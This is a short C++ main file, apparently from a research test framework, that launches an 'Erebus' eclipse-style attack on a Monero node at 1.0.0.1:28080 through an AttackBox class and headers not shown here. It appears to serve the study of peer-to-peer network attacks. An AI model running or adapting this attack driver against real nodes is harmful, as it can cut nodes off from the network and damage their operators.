//
// Created by ilios on 21. 4. 6..
//
#include <AttackBox.h>
#include <policy/ErebusAttackPolicy.h>
#include <ipdb/BitcoinIPDatabase.h>

#include "MoneroNodePrimitives.h"
#include "MoneroNodeParams.h"


using namespace sybiltest;

int main() {
    // initialize monero : This is necessary for using Monero's benign/shadow node
    std::cout << "EREBUS attack tester for monero started" << "\n";

    AttackBox<ErebusAttackPolicy, MoneroNodePrimitives, MoneroNodeParams, BitcoinIPDatabase> attackBox;
    attackBox.setTarget("1.0.0.1", 28080);
    if (!attackBox.setupAttack()) {
        std::cout << "setup attack failed" << "\n";
        return -1;
    }
    attackBox.startAttack();
    std::cout << "attack finished" << "\n";

    return 0;
}